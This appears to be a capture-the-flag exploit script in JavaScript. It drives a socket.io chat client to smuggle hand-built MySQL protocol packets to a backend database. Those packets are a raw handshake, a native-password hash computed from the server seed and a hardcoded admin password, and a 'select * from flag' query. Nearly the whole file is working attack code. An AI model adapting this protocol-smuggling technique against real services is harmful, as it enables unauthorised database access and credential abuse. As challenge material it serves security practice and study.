
function ab2str(buf) {
	console.log("xxxxxxxxxx "+typeof(buf)+buf)
	return new TextDecoder().decode(buf)
}

function Latin1ToUint8Array(iso_8859_1){
    var uInt8Arr = new Uint8Array(iso_8859_1.length);
    for(var i=0; i<iso_8859_1.length; i++){
        uInt8Arr[i] = iso_8859_1.charCodeAt(i);
    }
    return uInt8Arr;
}

function xor(key, phrase){
	var r = "";
	for(var i=0; i<phrase.length; i++){
		r += String.fromCharCode( key.charCodeAt(i%key.length) ^ phrase.charCodeAt(i) );
	}
	return r;
}

function convertFromHex(hex) {
    var hex = hex.toString();//force conversion
    var str = '';
    for (var i = 0; i < hex.length; i += 2)
        str += String.fromCharCode(parseInt(hex.substr(i, 2), 16));
    return str;
}

function addScript(cdnurl){
	var cjs_script = document.createElement("script");
	cjs_script.setAttribute('src',cdnurl);
	document.body.insertBefore(cjs_script,document.body.firstChild);	
}

async function digestMessage(message) {
  const msgUint8 = Latin1ToUint8Array(message);                           
  const hashBuffer = await crypto.subtle.digest('SHA-1', msgUint8);           
  const hashArray = Array.from(new Uint8Array(hashBuffer));                     
  const hashHex = hashArray.map(b => b.toString(16).padStart(2, '0')).join(''); 
  return hashHex;
}

async function step2(serverSeed){
	sha1 = CryptoJS.SHA1;
		
	//// mysql native password hashing process
	// SHA1( password ) XOR SHA1( "20-bytes random data from server" <concat> SHA1( SHA1( password ) ) )
	console.log("[+] seed "+btoa(serverSeed));
	var sp = await digestMessage(password);
	var ssp = await digestMessage(convertFromHex(sp))
	var sssp = await digestMessage(serverSeed+convertFromHex(ssp))
	console.log("[+] sssp "+btoa(sssp));
	
	var hashedPassword = xor( convertFromHex(sp), convertFromHex(sssp) );
	console.log("[+] hashed password "+btoa(hashedPassword))

	var p1 = "\x14\x00\x00\x03"+hashedPassword

	var query = "select * from flag#";
	var p2 = `${String.fromCharCode(query.length+9)}\x00\x00\x00\x03${query}`

	var packet = p1+p2;
	console.log(btoa(packet))
	setTimeout(function(){console.log("send 3 round");sock.emit("chatsend", packet);},500)
	setTimeout(function(){console.log("send 4 round");sock.emit("chatsend", "sendtome");},1500)
}

var round = 0;

var sock = io.connect('ws://127.0.0.1:9090/');
sock.on('connect', function(){
	var data = {'channel':uuid, 'userid':userid, 'chatserver': 'arang.kr:3306'};
	sock.emit("join",data);
});

sock.on('join', function(data){
	console.log(data)
	if(data["result"] == "fail"){
		alert("join room fail")
	}
})

// when get a new chat message
sock.on('newchat', function(data){
	console.log(data.msg);
	//var result = ab2str(data.msg);
	var result = data.msg;
	console.log("[+] newchat "+result);
	round += 1
	if (round == 2){
		console.log("[+] yeah! I got the server seed")
		var serverSeed = result.split("native_password\x00")[1].slice(0,-1);
		step2(serverSeed);
	}
})


var password = "th1s_1s_ch4tdb_4dm1n_p4ssw0rd";
addScript("https://cdnjs.cloudflare.com/ajax/libs/crypto-js/3.1.9-1/core.js");
addScript("https://cdnjs.cloudflare.com/ajax/libs/crypto-js/3.1.9-1/sha1.js");
var packet = "";

// step 1
//p1 = convertFromHex("c30000018da2bf0900000001ff00000000000000000000000000000000000000000000006172616e67330000746573740063616368696e675f736861325f70617373776f72640074045f706964053238373139095f706c6174666f726d067838365f3634035f6f73054c696e75780c5f636c69656e745f6e616d65086c69626d7973716c076f735f75736572056172616e670f5f636c69656e745f76657273696f6e06382e302e32330c70726f6772616d5f6e616d650573656e64746f6d65")

p1 = convertFromHex("c80000018da2bf0900000001ff00000000000000000000000000000000000000000000006172616e677465737400006368617464620063616368696e675f736861325f70617373776f72640074045f706964053239333632095f706c6174666f726d067838365f3634035f6f73054c696e75780c5f636c69656e745f6e616d65086c69626d7973716c076f735f75736572056172616e670f5f636c69656e745f76657273696f6e06382e302e32330c70726f6772616d5f6e616d650573656e64746f6d65")

setTimeout(function(){console.log("send 1 round");sock.emit("chatsend", p1);},500)
setTimeout(function(){console.log("send 2 round");sock.emit("chatsend", "sendtome");},1500)



